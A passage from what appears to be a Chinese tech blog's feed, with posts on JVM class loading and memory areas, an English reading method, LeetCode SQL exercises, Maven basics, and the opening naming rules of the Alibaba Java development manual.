运行时数据区域(Runtime Data Area)</p><blockquote><p>Classloader 把硬盘上的 <code>.class</code> 文件加载到 JVM 中的 Runtime Data Area，但是它不负责这个类文件能否执行，而是由 Execution Engine 来负责的。</p></blockquote><h3 id="ClassLoader（类加载器）"><a href="#ClassLoader（类加载器）" class="headerlink" title="ClassLoader（类加载器）"></a>ClassLoader（类加载器）</h3><p>Classloader 用来装载 <code>.class</code> 文件，它由两种装载 <code>.class</code> 的方式：</p><ol><li>隐式：运行过程中，碰到 new 方式生成对象时，隐式调用 Classloader 到 JVM。</li><li>显式：通过 <code>class.forname()</code> 动态加载。</li></ol><h4 id="Parent-Delegation-Model-双亲委派模型"><a href="#Parent-Delegation-Model-双亲委派模型" class="headerlink" title="Parent Delegation Model (双亲委派模型)"></a>Parent Delegation Model (双亲委派模型)</h4><p>类的加载过程采用双亲委托机制，这种机制能更好的保证 Java 平台的安全。<br>该模型要求除了顶层的 Bootstrap Class Loader 启动类加载器外，其余的类加载器都应当有自己的<strong>父类加载器</strong>。子类加载器和父类加载器<strong>不是以继承 (Inheritance) 的关系</strong>来实现的，而是通过<strong>组合 (Composition) 关系</strong>来复用父类加载器的代码。</p><p>每个类加载器都有自己的命名空间，该命名空间由该加载器及所有父类加载器所加载的类组成：</p><ul><li>在同一个命名空间中，不会出现类的完整名字（包括类的包名）相同的两个类；</li><li>在不同的命名空间中，有可能会出现类的完整名字（包括类的包名）相同的两个类。</li></ul><p><strong>双亲委派模型的工作过程：</strong></p><ol><li><p>当前 ClassLoaer 首先从自己已经加载的类中查询是否此类已经加载，如果已经加载则直接返回原来已经加载的类。</p><blockquote><p>每个类加载器都有自己的加载缓存，当一个类被加载了以后就会放入缓存，等下次加载的时候就可以直接返回了。</p></blockquote></li><li><p>当前 ClassLoader 的缓存中没有找到被加载的类时，委托父类加载器去加载，并将其放入自己的缓存中，以便下次有加载请求的时候直接返回。</p></li></ol><p><strong>使用这种模型来组织类加载器之间的关系的好处：</strong><br>主要为乐<strong>安全性</strong>，避免用户自己编写的类动态替换 Java 的一些核心类，比如 String，同时也避免了<strong>重复加载</strong>，因为 JVM 中区分不同类，不仅仅是根据类名，相同的 class 文件被不同的 ClassLoader 加载就是不同的两个类，如果互相转型的话会抛出 <code>java.lang.ClassCaseException</code>。</p><p>类加载器 ClassLoader 是具有层次结构的，也就是父子关系。其中 Bootstarp 是所有类加载器的父亲。如图：<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fhrhg8u51gj20f50cxdgv.jpg" alt="ClassLoader 层次结构"></p><ul><li><p><strong>Bootstrap Class Loader：父类</strong><br>当运行 Java 虚拟机时，这个类加载器被创建，它负责加载虚拟机的核心类库，如 java.lang.* 等。例如 java.lang.Object 就是由 Bootstrap Class Loader 加载的。</p><blockquote><p>Bootstrap Class Loader 不是用 Java 语言写的，而是用 C/C++ 写的。</p></blockquote></li><li><p><strong>Extension Class Loader：</strong><br>这个加载器加载除了基本 API 之外的一些拓展类。</p></li><li><p><strong>AppClass Loader：</strong><br>加载应用程序和程序员自定义的类。</p></li></ul><p>除了以上虚拟机自带的加载器以外，用户还可以定制自己的类加载器（<strong>User-defined Class Loader</strong>)。Java 提供了抽象类 java.lang.ClassLoader，所有用户自定义的类加载器应该继承 ClassLoader 类。</p><p>这是 JVM 分工自治生态系统的一个很好的体现。</p><h3 id="Execution-Engine（执行引擎）"><a href="#Execution-Engine（执行引擎）" class="headerlink" title="Execution Engine（执行引擎）"></a>Execution Engine（执行引擎）</h3><p>执行引擎就是用于执行字节码，或者执行本地方法</p><h3 id="Runtime-Data-Area（运行时数据区域）"><a href="#Runtime-Data-Area（运行时数据区域）" class="headerlink" title="Runtime Data Area（运行时数据区域）"></a>Runtime Data Area（运行时数据区域）</h3><p>JVM 运行时数据区（JVM Runtime Data Area）指在运行期间，其对 JVM 内存空间的划分和分配。JVM 在运行时将数据划分为了 6 个区域来存储。</p><p>程序员写的所有程序都被加载到 <strong>Runtime Data Area</strong> 中，不同类别放在 Heap Memory，Java Stack，Native Method Stack，PC Register 和 Method Area 中。</p><p><strong>下面对各个部分的功能和存储内容进行描述：</strong><br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fhrhvgb5kpj20ha0de760.jpg" alt="JVM Memory Structure"></p><ol><li><p><strong>PC Register (PC 程序计数器)：</strong><br>一块较小的内存空间，可以看作是当前<strong>线程</strong>所执行字节码的行号指示器，存储每个线程下一步将执行的 JVM 指令，如该方法为 native 的，则 PC 寄存器中不存储任何信息。<br>Java 的多线程机制离不开程序计数器，每个线程都有一个自己的 PC，以便完成不同线程上下文环境的切换。</p></li><li><p><strong>JVM Stack (Java 虚拟机栈)：</strong><br>与 PC 一样，Java 虚拟机栈也是线程私有的。<br>每一个 JVM 线程都有自己的 Java 虚拟机栈，这个栈与线程同时创建，它的生命周期与线程相同。<br>虚拟机栈描述的是 <strong>Java 方法执行的内存模型：</strong></p><ul><li>每个方法被执行的时候都会同时创建一个<strong>栈帧（Stack Frame）</strong>用于存储局部变量表、操作数栈、动态链接和方法出口等信息。</li><li><strong>每一个方法被调用直至执行完成的过程就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。</strong></li></ul></li><li><p><strong>Native Method Stack (本地方法栈)：</strong><br>与虚拟机栈的作用相似，虚拟机栈为虚拟机执行 Java 方法服务，而本地方法栈则为虚拟机使用道的本地方法服务。</p></li><li><p><strong>Heap Memory (Java 堆)：</strong><br>Java 堆是被所有线程共享的一块存储区域，在虚拟机启动的时候创建，它是 JVM 用来存储对象实例以及数组值的区域，可以认为 Java 中所有通过 new 创建的对象其内存都在此分配。<br>Java 堆在 JVM 启动的时候就被创建，堆中存储了各种对象，这些对象被自动管理内存系统所管理。这些对象无需、也无法显式地被销毁。<br>JVM 将 Heap 分为两块：New Generation 和 Old Generation</p><blockquote><p>自动管理内存系统所管理：Automatic Storage Management System 也就是常说的 Garbage Collector（垃圾回收器）</p></blockquote></li><li><p><strong>Method Area (方法去)：</strong></p></li><li><p>运行时常量池：</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> JVM </tag>
            
            <tag> GC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语中的阅读理解</title>
      <link href="/2017/07/16/readingcomprehension/"/>
      <url>/2017/07/16/readingcomprehension/</url>
      
        <content type="html"><![CDATA[<p>理解是一个学习的好方法，很多人会阅读，但是他们却不能真正的理解他们所读的东西。<br>这篇文章将告诉你如何理解你所阅读的东西。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1."></a>Step 1.</h2><ul><li><strong>Reading quickly —— 快速阅读</strong></li><li><strong>Don’t use a dictionary —— 不要使用字典</strong></li><li><strong>Underline the words you don’t know —— 将不懂的词标记出来</strong></li></ul><p>在我们阅读的时候，很多时候我们并不理解其中所有的单词意思，也不可能总会去查字典，这时我们会读这个单词周围的词，并且找出这个词的大概意思，这就是<strong>上下文 (context)</strong> 的概念，这一点对于理解很重要。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2."></a>Step 2.</h2><ul><li><strong>Read again —— 再读一遍</strong></li><li><strong>Use the dictionary —— 使用字典查出不懂的单词</strong></li><li><strong>Summarize each paragraph —— 总结每个段落</strong></li></ul><p>经过快速阅读一遍之后，我们会有一些问题「这些词是什么意思？」，这时，我们再花时间读一遍文章，使用字典查出不懂的单词，然后将每个段落用一句话总结出来。</p><p>在每一个段落里肯能有很多信息需要总结成一句话，但是它使我们真正明白了我们读了什么。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3."></a>Step 3.</h2><ul><li><strong>Read again —— 再读一遍！</strong></li><li><strong>Summarize everything —— 总结整篇文章</strong></li></ul><p>这次，我们要读完整片文章并且总结我们所读的内容。在我们总结完所有内容后，我们会发现我们真的明白了我们在做什么。我们读了三次，每一次都更深入的读懂这篇文章。</p><p>但这不是最酷的一部分，真正酷的部分是：<br><strong>在一次又一次的阅读过程中，我们学会了成语(idioms)、短语(phrases)和单词(words)，并且几乎不会忘记！</strong></p><p>这就是最酷的一部分！每一次我们阅读一些新的东西时只要记住这个方法，花时间用这个方法去阅读，保持住这个习惯，一开始可能会比较慢，但是我保证如果你遵循这个方法，一个月后，你将会发现自己的阅读水平有极大的提高！</p>]]></content>
      
      
      <categories>
          
          <category> English </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reading </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 练习</title>
      <link href="/2017/07/07/leetcode-sql/"/>
      <url>/2017/07/07/leetcode-sql/</url>
      
        <content type="html"><![CDATA[<p>空闲时间刷刷<a href="https://leetcode.com/problemset/database/">数据库的面试题</a>，用实践来学习/提高自己优化数据库的能力～</p><span id="more"></span><h2 id="交换性别"><a href="#交换性别" class="headerlink" title="交换性别"></a>交换性别</h2><p>Given a table <code>salary</code>, such as the one below, that has m=male and f=female values. Swap all f and m values (i.e., change all f values to m and vice versa) with a single update query and no intermediate temp table.</p><p>给定一个数据表 <code>salary</code>，表格如下，该表格中，m 代表男，f 代表女。使用一条 update 语句交换所有 f 和 m 的值（将所有 f 的值改成 m，反之亦然），并且没有中间临时表。</p><p>For example（例如）:</p><table><thead><tr><th align="center">id</th><th align="center">name</th><th align="center">sex</th><th>salary</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">A</td><td align="center">m</td><td>2500</td></tr><tr><td align="center">2</td><td align="center">B</td><td align="center">f</td><td>1500</td></tr><tr><td align="center">3</td><td align="center">C</td><td align="center">m</td><td>5500</td></tr><tr><td align="center">4</td><td align="center">D</td><td align="center">f</td><td>500</td></tr></tbody></table><p>After running your query, the above salary table should have the following rows:</p><p>运行完你的查询语句后，上面的数据表应该变为下面这样：</p><table><thead><tr><th>id</th><th>name</th><th>sex</th><th>salary</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>f</td><td>2500</td></tr><tr><td>2</td><td>B</td><td>m</td><td>1500</td></tr><tr><td>3</td><td>C</td><td>f</td><td>5500</td></tr><tr><td>4</td><td>D</td><td>m</td><td>500</td></tr></tbody></table><h3 id="查询语句-1"><a href="#查询语句-1" class="headerlink" title="查询语句 1"></a>查询语句 1</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">UPDATE salary SET sex=(CASE WHEN sex='m' THEN 'f' ELSE 'm' END);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该语句简单明了，容易理解，其中</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CASE WHEN 条件 THEN 真 ELSE 假 END<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等价于 Java 中的</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">if () {...} else {...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里不再赘述。</p><h3 id="查询语句-2"><a href="#查询语句-2" class="headerlink" title="查询语句 2"></a>查询语句 2</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">UPDATE salary SET sex = CHAR(ASCII('f') ^ ASCII('m') ^ ASCII(sex));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ASCII(str)<br>返回字符串 str 的最左面字符的 ASCII 代码值。<br>如果 str 是空字符串，返回 0。如果 str 是 NULL，返回 NULL。</p></blockquote><p>该语句使用了<strong>异或运算</strong>，先计算 f 和 m 的异或值，然后用其结果再与数据表中的每个 sex 值计算异或值，结果则为 sex 的反值。例如：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">int f = 'f';//102int m = 'm';//109System.out.println(Integer.toBinaryString(f));//1100110System.out.println(Integer.toBinaryString(m));//1101101int r = f ^ m;int r = f ^ m;System.out.println(Integer.toBinaryString(r));//0001011int sex;sex = 'f';System.out.println(Integer.toBinaryString(r ^ sex));//1101101sex = 'm';System.out.println(Integer.toBinaryString(r ^ sex));//1100110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>异或运算：两个操作数的位中，相同则结果为 0，不同则结果为 1。</p></blockquote><br>## 结合两个表Table: `Person`<table><thead><tr><th>Column Name</th><th>Type</th></tr></thead><tbody><tr><td>PersonId</td><td>int</td></tr><tr><td>FirstName</td><td>varchar</td></tr><tr><td>LastName</td><td>varchar</td></tr><tr><td>PersonId is the primary key column for this table.</td><td></td></tr><tr><td>PersonId 是这张表的主键。</td><td></td></tr></tbody></table><p>Table: <code>Address</code></p><table><thead><tr><th>Column Name</th><th>Type</th></tr></thead><tbody><tr><td>AddressId</td><td>int</td></tr><tr><td>PersonId</td><td>int</td></tr><tr><td>City</td><td>varchar</td></tr><tr><td>State</td><td>varchar</td></tr><tr><td>AddressId is the primary key column for this table.</td><td></td></tr><tr><td>AddressId 是这张表的主键。</td><td></td></tr></tbody></table><p>Write a SQL query for a report that provides the following information for each person in the Person table, regardless if there is an address for each of those people:</p><p>写一个数据库语句，无论每个人是否有地址，查询结果都要提供 <code>Person</code> 表中每个人的以下信息：</p><p>FirstName, LastName, City, State</p><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT FirstName, LastName, City, State FROM Person p LEFT JOIN Address a ON p.PersonId = a.PersonId;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## Employees Earning More Than Their ManagersThe `Employee` table holds all employees including their managers. Every employee has an Id, and there is also a column for the manager Id.<p>数据库表 <code>Employee</code> 包括所有员工以及他们的经理。每个员工都有一个 Id 以及一个经理 Id。</p><table><thead><tr><th align="center">Id</th><th align="center">Name</th><th align="center">Salary</th><th align="center">ManagerId</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">Joe</td><td align="center">70000</td><td align="center">3</td></tr><tr><td align="center">2</td><td align="center">Henry</td><td align="center">80000</td><td align="center">4</td></tr><tr><td align="center">3</td><td align="center">Sam</td><td align="center">60000</td><td align="center">NULL</td></tr><tr><td align="center">4</td><td align="center">Max</td><td align="center">90000</td><td align="center">NULL</td></tr><tr><td align="center">Given the <code>Employee</code> table, write a SQL query that finds out employees who earn more than their managers. For the above table, Joe is the only employee who earns more than his manager.</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>给定数据表 <code>Employee</code>，写一个 SQL 语句，找出哪些员工的收入高于他们的经理。例如上面的表格中只有 Joe 的收入高于他的经理。</p><table><thead><tr><th align="center">Employee</th></tr></thead><tbody><tr><td align="center">Joe</td></tr></tbody></table><h3 id="查询语句-1-1"><a href="#查询语句-1-1" class="headerlink" title="查询语句 1"></a>查询语句 1</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT e.Name Employee FROM Employee e WHERE e.Salary &gt; (SELECT salary FROM Employee c WHERE c.Id = e.ManagerId);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询语句-2-1"><a href="#查询语句-2-1" class="headerlink" title="查询语句 2"></a>查询语句 2</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select E1.Name Employeefrom Employee as E1, Employee as E2where E1.ManagerId = E2.Id and E1.Salary &gt; E2.Salary;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="查询语句-3"><a href="#查询语句-3" class="headerlink" title="查询语句 3"></a>查询语句 3</h3><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select a.Name Employeefrom Employee a inner join Employee b on a.ManagerId=b.Idwhere a.Salary&gt;b.Salary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven</title>
      <link href="/2017/06/26/maven/"/>
      <url>/2017/06/26/maven/</url>
      
        <content type="html"><![CDATA[<p>Maven 是一个项目构建工具，他的作用如下：</p><ul><li>项目构建</li><li>对依赖的管理（jar 包的管理）</li><li>生成站点报告或文档</li></ul><span id="more"></span><p>下载 maven</p><p>配置环境变量：</p><ul><li>JDK 环境变量</li><li>M2_HOME: 存放 maven 的位置<br>PATH: %M2_HOME%\bin;</li></ul><p>maven 项目结构：<br>工程名<br>    src<br>        main<br>            java<br>        test<br>            java</p><p>项目构建的<strong>核心</strong>过程（编译 测试 打包 发布）<br>编译 mvn compile<br>测试 mvn test<br>打包 mvn package<br>发布 mvn install</p><p>maven 中的仓库：</p><ul><li>中央仓库（外部）</li><li>私服（公司内部）</li><li>本地仓库（本机）</li></ul><p>构建：<br>公共资源。<br>依赖、插件<br>仓库：<br>    存放或者管理资源的位置<br>远程仓库<br> 中央仓库<br>  私服仓库<br>   本地仓库</p><h3 id="maven-项目构建的整个生命周期"><a href="#maven-项目构建的整个生命周期" class="headerlink" title="maven 项目构建的整个生命周期"></a>maven 项目构建的整个生命周期</h3><ol><li>清理 clean<ol><li>清理前的准备工作</li><li>清理上一次的构建内容</li></ol></li><li>默认的 default 生命周期<ol><li>初始化</li><li>编译</li><li>测试打包</li><li>集成测试</li><li>安装（本地仓库）或发布（deploy）</li><li>生成站点</li></ol></li><li>生成站点报告、项目文档报告等（需要 maven 插件）<ol><li>生成站点的准备工作</li><li>生成站点报告</li><li>生成站点报告后的工作</li></ol></li></ol><h3 id="搭建局域网私服"><a href="#搭建局域网私服" class="headerlink" title="搭建局域网私服"></a>搭建局域网私服</h3><p>下载 <a href="https://archiva.apache.org/download.cgi">apache-archiva-x.x.x</a></p><p>Neuex: 私服<br>下载好后解压，配置环境变量<br>启动服务器：<br>archiva.bat console<br>localhost：8080:<br>界面：新建用户 user 登陆<br>添加 centerl 仓库的资源的奥私服中。<br>需要额外添加 点击 add 按钮添加即可。</p><p>配置 maven setting.xml 中的 server 和 mirror 标签</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>abcde<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>server</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>abcde<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">&gt;</span></span>*&lt;/&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成站点"><a href="#生成站点" class="headerlink" title="生成站点"></a>生成站点</h3><p>site plugin</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-site-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reporting</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-doc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reporting</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="webservice"><a href="#webservice" class="headerlink" title="webservice"></a>webservice</h3><p>跨平台、跨服务器、跨语言的远程接口调用。<br>在网络上一个工程（java 项目），可以远程调用另外一个工程中的接口功能（不一定是 java 语言写的</p><p>例如支付功能，通常使用 webservice 调用现有的大型支付接口（如支付宝、网银等）</p><p>工程之间通过协议（soap 格式的数据）传输数据（xml、json 等工程）。</p><p>spring 整合 cxf 框架（webservice 的封装框架）</p><p>准备工作，下载 cxf 框架的 jar 包</p><p>其他构建工具<br>Ant：项目构建工具（编译 测试 打包 集成测试）<br>Gradle：项目构建工具</p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
            <tag> 构建工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里巴巴 Java 开发手册</title>
      <link href="/2017/06/16/alidevelopmentnotebook-1.2.0/"/>
      <url>/2017/06/16/alidevelopmentnotebook-1.2.0/</url>
      
        <content type="html"><![CDATA[<p>此套 Java 开发手册阿里巴巴 Java 技术团队，近万名阿里 Java 技术精英的经验总结，并经历了多次大规模一线实战检验及完善，铸就了这本高含金量的阿里 Java 开发手册。该手册以 Java 开发者为中心视角，划分为编程规约、异常日志规约、MYSQL 规约、工程规约、安全规约五大块，再根据内容特征，细分成若干二级子目录。根据约束力强弱和故障敏感性，规约依次分为强制、推荐、参考三大类。此套规范不仅能让代码一目了然，更有助于加强团队分工与合作、真正提升效率。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《阿里巴巴 Java 开发手册》是阿里巴巴集团技术团队的集体经验总结，经历了多次大规模一线实战的检验及不断地完善，反馈给广大开发者。现代软件行业的告诉发展对开发者的综合素质要求越来越高，因为不仅是编程知识点，其他维度的知识点也会影响到软件的最终交付质量最终交付质量。比如：数据库的表结构和索引设计缺陷可能带来软件商的架构缺陷或性能奉献；工程结构混乱导致后续维护艰难；没有健全的漏洞代码易被黑客攻击等等。所以本手册以 Java 开发者为中新世交中心视角，划分为编程规约、异常日志、MySQL 数据库、工程结构、安全规约五大块，再根据内容特征，细分为若干二级子目录。根据约束力强弱及故障敏感性，规约一次分为强制、推荐、参考三大类。对于规约条目的眼神信息中，“说明”对内容作了隐身和解释；“正例”提倡什么样的编码和实现方式；“反例”说明需要提防的雷区，以及真实的错误案例。<br><br><br>本手册的愿景是<strong>码出高效、码出质量</strong>。代码的字里行间流淌的是软件生命中的血液，质量的提升是尽可能少踩坑，杜绝踩重复的坑，切实提升质量意识。另外，现代软件架构都需要协同开发完成，高效协作既降低协同成本，提升沟通效率，所谓无规矩不成方圆，无规范不能协作。众所周知，制定交通法规表面上是要限制行车权，实际上是保障公众的人身安全。试想如果没有限速，没有红绿灯，谁还敢上路行驶。对软件来说，适当的规范和标准绝不是消灭代码内容的创造性、优雅性，而是限制过度个性化，以一种普遍认可的统一方式一起做事，提升协作效率。<br><br><br>《阿里巴巴 Java 开发手册》，开放包容地认真听取社区、博客、论坛的反馈，及时修正，保持与时俱进。请关注手册末页的“<a href="https://102.alibaba.com/">阿里技术</a>”和“<a href="https://yq.aliyun.com/">云栖社区</a>”公众号获取最新版本。</p><br>## 目录前言一、编程规约    （一） 命名风格    （二） 常量定义    （三） 代码格式    （四） OOP 规约    （五） 集合处理    （六） 并发处理    （七） 控制语句    （八） 注释规约    （九） 其他二、异常日志    （一） 异常处理    （二） 日志规约三、MySQL 数据库    （一） 建表规约    （二） 索引规约    （三） SQL 语句    （四） ORM 映射四、工程结构    （一） 应用分层    （二） 二房库依赖    （三） 服务器五、安全规约附 1：历史版本附 2：本手册转悠名词<br>## Java 开发手册|版本号|制定团队|更新日志|备注||:---:|:---:|:---:|:---:||1.2.0|阿里巴巴集团技术团队|2017.5.20|公开征集意见后的修正版本。|<br>## 一、编程规约### （一）命名风格1. 【强制】 代码中的命名均不能以蓝色开始**下划线或美元符号蓝色结束开始，也不能以蓝色开始**下划线或美元符号**蓝色结束结束。红色开始反例：红色结束 _name / __name / $Object / name_ / name$ / Object$2. 【强制】 代码中的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，即使纯拼音命名方式也要避免采用。正例： alibaba / taobao / youku / hangzhou 等国际通用的名称，可视同英文。反例： DaZhePromotion [打折] / getPingfenByName() [评分] / int 某变量 = 33. 【强制】 类名使用 UpperCamelCase 风格，必须遵从驼峰形式，但以下情形例外：DO / BO / DTO / VO /AO正例： MarcoPolo / UserDO / XmlService / TcpUdpDeal / TaPromotion反例： macroPolo / UserDo / XMLService / TCPUDPDeal / TAPromotion4. 【强制】 方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式。正例： localValue / getHttpMessage() / inputUserId5. 【强制】 常量命名全部大写，单词键用下划线隔开，力求语义表达完整清楚，不要嫌名字长。正例： MAX_STOCK_COUNT反例： MAX_COUNT6. 【强制】 抽象类名使用 Abstract 或 Base 开头；异常类命名使用 Exception 结尾；测试类命名以它要测试的类的名称开始，以 Test 结尾。7. 【强制】 中括号是数组类型的一部分，数组定义如下：`String[] args;`；反例： 使用 `String args[]` 的方式来定义。8. 【强制】 POJO 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。反例： 定义为基本数据类型 `Boolean isDeleted;` 的属性，它的方法也是 `isDeleted()`，RPC 框架在反向解析的时候，“以为”对应的属性名称是 deleted，导致属性获取不到，进而跑出异常。9. 【强制】 包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用蓝色开始**单数**蓝色结束形式，但是类名如果有复数寒意，类名可以使用复数形式。正例： 应用工具类包名为 com.alibaba.open.util、类名为 MessageUtils（此规则参考 spring 的框架结构）。10. 【强制】 杜绝完全不规范的缩写，避免忘文不知义。反例： AbstractClass “缩写”命名成 AbsClass；condition “缩写”命名成 condi，此类随意缩写严重降低了代码的可阅读星。11. 【推荐】 如果使用到了设计模式，建议在类名中体现出具体模式。说明： 将设计模式体现在名字中，有利于阅读者快速理解架构设计思想。正例： <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class OrderFactory;public class LoginProxy;public class ResourceObserver;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>12. 【推荐】 接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是与接口方法相关，并且是整个应用的基础常量。正例：    - 接口方法签名： `void f();`    - 接口基础常量表示： `String COMPANY = "alibaba";`反例： 接口方法定义：`public abstract void f();`说明： JDK 8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。13. 接口和实现类的命名有两套规则：    1. 【强制】 对于 Service 和 DAO 类，基于 SOA 的理念，暴露出来的服务一定是接口，内部的实现类用 Impl 的后缀与接口区别。    正例： 